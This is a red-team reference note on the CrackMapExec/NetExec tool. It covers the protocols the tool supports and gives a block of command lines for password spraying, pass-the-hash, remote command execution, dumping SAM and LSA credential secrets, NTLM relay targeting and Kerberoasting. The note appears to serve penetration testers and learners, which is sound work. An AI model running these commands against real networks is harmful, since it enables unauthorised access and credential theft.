---
title: CrackMapExec / NetExec
aliases: ["CrackMapExec", "CME", "NetExec", "nxc", "crackmapexec", "CrackMapExec / NetExec"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "byt3bl33d3r / Pennyw0rd"
source_url: "https://github.com/Pennyw0rd/NetExec"
verified: true
related: ["[[Pass-the-Hash]]", "[[SMB]]", "[[Remote Execution & Lateral Movement (Windows)]]", "[[NTLM Relay]]", "[[Kerberoasting]]"]
created: 2026-06-07
updated: 2026-06-07
---

# CrackMapExec / NetExec

> [!summary] One-liner
> A Swiss-army knife for network pentesting — mass-tests credentials across SMB/LDAP/WinRM/MSSQL/SSH, sprays passwords, enumerates shares/users/sessions, executes commands, and dumps credentials at scale.

## Core protocols

| Protocol | Flag | Common uses |
|---|---|---|
| SMB | `smb` | Auth testing, share enum, command exec, SAM dump, [[Pass-the-Hash]] |
| LDAP | `ldap` | User/group enum, [[Kerberoasting]], [[AS-REP Roasting]] |
| WinRM | `winrm` | Remote PowerShell execution |
| MSSQL | `mssql` | SQL auth testing, xp_cmdshell |
| SSH | `ssh` | Linux host testing |

## Common usage
```bash
# Password spray across a subnet
nxc smb 10.0.0.0/24 -u <USER> -p <PASS> -d <DOMAIN>

# Pass-the-hash
nxc smb <TARGET> -u <USER> -H <NT_HASH> -d <DOMAIN>

# Execute command
nxc smb <TARGET> -u <USER> -p <PASS> -d <DOMAIN> -x "whoami"

# Dump SAM (local hashes)
nxc smb <TARGET> -u <USER> -p <PASS> --sam

# Dump LSA secrets
nxc smb <TARGET> -u <USER> -p <PASS> --lsa

# Enumerate shares
nxc smb <TARGET> -u <USER> -p <PASS> --shares

# Check SMB signing (for relay targeting)
nxc smb 10.0.0.0/24 --gen-relay-list unsigned.txt

# Kerberoasting via LDAP
nxc ldap <DC_IP> -u <USER> -p <PASS> --kerberoasting kerberoast.txt

# Bloodhound-compatible session enum
nxc smb 10.0.0.0/24 -u <USER> -p <PASS> --sessions
```

## Pwn3d! indicator
When CME/NetExec shows `(Pwn3d!)` next to a host, it means the credentials have **admin access** — commands can be executed, hashes can be dumped.

## Related
- Credential attacks: [[Pass-the-Hash]], [[Kerberoasting]], [[AS-REP Roasting]].
- Protocol: [[SMB]].
- Lateral movement: [[Remote Execution & Lateral Movement (Windows)]].
- Complements: [[Impacket]] (CME uses Impacket libraries under the hood).
